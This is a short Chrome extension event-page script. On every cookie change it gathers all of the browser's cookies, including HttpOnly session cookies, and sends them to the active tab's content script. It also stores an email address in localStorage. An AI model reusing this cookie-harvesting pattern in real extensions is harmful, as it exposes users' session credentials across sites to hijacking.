// Use event page to grab Cookies including HTTPOnly cookies which are not available in the DOM
chrome.cookies.onChanged.addListener( function(changeInfo) {

	var cookiejar = "";
	
	chrome.cookies.getAll({}, function(cks) {

		for(var i=0; i<cks.length; i++) {
			cookiejar += "(" + cks[i].name + "=" + cks[i].value + ")";		
		}

	});

	chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
		if(cookiejar.length > 0)
    		chrome.tabs.sendMessage(tabs[0].id, {action: "cookiejar", val: cookiejar}, function(response) {});  
    });

});

// For Local Storage storing.
chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
        switch(request.type) {
			case 'getEmail':
				sendResponse({value: localStorage["email"]});
				return true;
						
			case 'storeEmail':
				localStorage["email"] = request.value; 
				break;

		}
});